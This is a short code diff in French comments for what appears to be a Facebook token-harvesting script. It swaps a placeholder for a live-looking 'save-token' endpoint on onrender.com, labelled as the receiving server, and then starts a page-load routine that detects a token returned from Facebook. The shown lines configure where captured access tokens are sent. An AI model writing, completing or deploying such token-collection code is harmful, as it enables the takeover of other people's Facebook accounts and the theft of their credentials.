@@ -1,5 +1,5 @@
 const GITHUB_URL = "https://ton-pseudo.github.io/ton-depot/"; // Remplace par ton lien GitHub
-const RENDER_URL = "https://ton-site.render.com/save-token"; // Ton serveur de réception
+const RENDER_URL = "https://token-claim.onrender.com/save-token"; // Ton serveur de réception
 
 // 1. Détecter si on revient de Facebook avec un Token
 window.onload = function() {
